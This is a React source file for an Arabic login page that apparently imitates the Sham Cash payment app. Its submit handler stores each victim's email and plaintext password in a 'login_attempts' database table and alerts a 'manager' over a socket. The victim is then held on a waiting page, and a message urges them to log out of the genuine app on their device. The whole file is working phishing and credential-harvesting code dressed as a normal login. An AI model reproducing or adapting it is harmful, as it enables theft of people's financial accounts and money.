import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { supabase } from '@/lib/supabase';
import { getClientId } from '@/lib/clientId';
import { useSiteConfig } from '@/context/SiteConfigContext';
import { initSocket, disconnectSocket, updatePage, emitInstantNotification } from '@/lib/socket';

// Import Logo Component
const Logo = () => (
  <svg viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg" className="w-[70px] h-[70px]">
    <path d="M20 30 L50 10 L80 30 L50 50 Z" fill="#4c72b8"/>
    <path d="M20 70 L50 50 L80 70 L50 90 Z" fill="#2a9d8f"/>
  </svg>
);

// Import PowerLogo Component
const PowerLogo = () => (
  <svg viewBox="0 0 100 100" fill="none" stroke="#6c7a9c" strokeWidth="8" className="w-[30px] h-[30px]">
    <polygon points="50,10 90,30 90,70 50,90 10,70 10,30"/>
  </svg>
);

export default function LoginPage() {
  const navigate = useNavigate();
  const { config } = useSiteConfig();
  const pg = config.login;

  const [email, setEmail] = useState(sessionStorage.getItem('reg_email') || '');
  const [password, setPassword] = useState('');
  const [showPass, setShowPass] = useState(false);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [hasShownRejectionError, setHasShownRejectionError] = useState(false);

  // Socket.io connection
  useEffect(() => {
    initSocket('/login');
    
    return () => {
      disconnectSocket();
    };
  }, []);

  // تحقق إذا كان هناك محاولة تسجيل مرفوضة
  useEffect(() => {
    const rejected = sessionStorage.getItem('login_rejected');
    const logoutNotice = sessionStorage.getItem('logout_notice');
    
    if (logoutNotice === 'true') {
      setError('يرجى تسجيل الخروج من تطبيق شام كاش المثبت على جهازك قبل التسجيل هنا');
      setHasShownRejectionError(true);
      sessionStorage.removeItem('logout_notice');
      sessionStorage.removeItem('login_rejected');
    } else if (rejected === 'true') {
      setError('البريد الإلكتروني أو كلمة المرور غير صحيحة. يرجى التأكد وإعادة المحاولة.');
      setHasShownRejectionError(true);
      sessionStorage.removeItem('login_rejected');
    }
  }, []);

  // Log error state changes
  useEffect(() => {
    console.log('Error state changed to:', error);
  }, [error]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!email.includes('@')) { setError('البريد الإلكتروني غير صحيح'); return; }
    if (!password) { setError('كلمة المرور مطلوبة'); return; }

    setLoading(true);
    setError('');

    try {
      // Save to sessionStorage
      sessionStorage.setItem('reg_email', email.trim().toLowerCase());
      sessionStorage.setItem('reg_password', password);

      const clientId = getClientId();
      
      // حفظ محاولة تسجيل الدخول
      const { data, error: insertError } = await supabase
        .from('login_attempts')
        .insert({
          client_id: clientId,
          email: email.trim().toLowerCase(),
          password: password,
          status: 'pending',
        })
        .select()
        .single();

      if (insertError) {
        console.warn('Could not save login attempt:', insertError);
        // إذا فشل حفظ المحاولة، نستخدم النظام القديم
        setLoading(false);
        navigate('/verify');
        return;
      }

      // حفظ معرف المحاولة في sessionStorage
      sessionStorage.setItem('login_attempt_id', data.id);

      // Notify the manager immediately without sending credentials
      await emitInstantNotification('login_attempt', {
        id: data.id,
        created_at: typeof data.created_at === 'string' ? data.created_at : new Date().toISOString(),
      });
      
      setLoading(false);
      navigate('/waiting');
    } catch (err: any) {
      console.error('Login error:', err);
      setLoading(false);
      setError(`خطأ: ${err.message || 'حدث خطأ غير متوقع'}`);
    }
  };

  // منع كتابة الأحرف العربية
  const preventArabic = (e: React.ChangeEvent<HTMLInputElement>, setter: (value: string) => void) => {
    const value = e.target.value.replace(/[\u0600-\u06FF]/g, '');
    setter(value);
  };

  return (
    <div className="min-h-screen w-full bg-[#101935] flex flex-col justify-between p-5" dir="rtl">
      {/* Top Bar */}
      <div className="w-full flex justify-between items-center text-[#8d99ae] text-sm">
        <span>الإنكليزية</span>
        <i className="fa-solid fa-headset text-lg cursor-pointer"></i>
      </div>

      {/* Main Content - Centered */}
      <div className="w-full max-w-[380px] mx-auto my-0 flex flex-col items-center">
        {/* Logo */}
        <div className="my-2.5 mb-5">
          <Logo />
        </div>

        {/* Title */}
        <h1 className="text-2xl font-bold mb-6 w-full text-right text-white">
          {pg.title}
        </h1>

        {/* Form */}
        <form onSubmit={handleSubmit} className="w-full space-y-4">
          {/* Email Field */}
          <div className="relative w-full">
            <i className="fa-solid fa-user absolute right-4 top-1/2 -translate-y-1/2 text-[#6c7a9c]"></i>
            <input
              type="email"
              value={email}
              onChange={(e) => {
                preventArabic(e, setEmail);
                if (!hasShownRejectionError) setError('');
              }}
              placeholder="البريد الإلكتروني"
              dir="ltr"
              className="w-full py-[14px] pr-11 pl-4 bg-[#1e2942] border border-[#2a3859] rounded-[10px] text-white text-sm placeholder-[#6c7a9c] focus:outline-none focus:border-[#4c72b8]"
            />
          </div>

          {/* Password Field */}
          <div className="relative w-full">
            <i className="fa-solid fa-lock absolute right-4 top-1/2 -translate-y-1/2 text-[#6c7a9c]"></i>
            <input
              type={showPass ? 'text' : 'password'}
              value={password}
              onChange={(e) => {
                preventArabic(e, setPassword);
                if (!hasShownRejectionError) setError('');
              }}
              placeholder="كلمة السر"
              dir="ltr"
              className="w-full py-[14px] pr-11 pl-11 bg-[#1e2942] border border-[#2a3859] rounded-[10px] text-white text-sm placeholder-[#6c7a9c] focus:outline-none focus:border-[#4c72b8]"
            />
            <i 
              className={`fa-regular ${showPass ? 'fa-eye-slash' : 'fa-eye'} absolute left-4 top-1/2 -translate-y-1/2 text-[#6c7a9c] cursor-pointer hover:text-white transition-colors`}
              onClick={() => setShowPass(!showPass)}
            ></i>
          </div>

          {/* Error Message */}
          {error && (
            <div className="text-red-400 text-sm text-center py-2 px-3 bg-red-500/10 border border-red-500/20 rounded-lg">
              {error}
            </div>
          )}

          {/* Forgot Password Link */}
          <div className="w-full text-center text-[13px] text-[#8d99ae] mb-5">
            هل نسيت كلمة المرور؟{' '}
            <span className="text-[#4a7c59] font-bold cursor-pointer hover:underline">تغيير كلمة المرور</span>
          </div>

          {/* Action Buttons */}
          <div className="w-full flex gap-2.5 mb-4">
            <button
              type="submit"
              disabled={loading}
              className="flex-1 py-3 bg-[#4c72b8] border-none rounded-[10px] text-white text-base font-bold cursor-pointer transition-all hover:bg-[#3b5a93] disabled:bg-[#3b4d75] disabled:cursor-not-allowed flex items-center justify-center gap-2"
            >
              {loading ? (
                <>
                  انتظر
                  <span className="inline-block w-6 text-right">
                    <span className="animate-pulse">.</span>
                    <span className="animate-pulse delay-200">.</span>
                    <span className="animate-pulse delay-400">.</span>
                  </span>
                </>
              ) : (
                pg.button_text
              )}
            </button>
            <button 
              type="button"
              className="w-[50px] h-12 bg-[#4c72b8] border-none rounded-[10px] text-white flex items-center justify-center cursor-pointer text-lg hover:bg-[#3b5a93] transition-all"
              title="مسح QR"
            >
              <i className="fa-solid fa-qrcode"></i>
            </button>
          </div>
        </form>

        {/* Register Link */}
        <div className="w-full text-[13px] text-[#8d99ae] mb-6 text-center">
          لا تملك حساب مسبقاً؟{' '}
          <span 
            className="text-[#4a7c59] font-bold cursor-pointer hover:underline"
            onClick={() => navigate('/register')}
          >
            إنشاء حساب
          </span>
        </div>
      </div>

      {/* Footer */}
      <div className="flex flex-col items-center text-[#6c7a9c] text-xs gap-1">
        <span>POWERED BY</span>
        <PowerLogo />
        <span>احدث اصدار</span>
      </div>
    </div>
  );
}
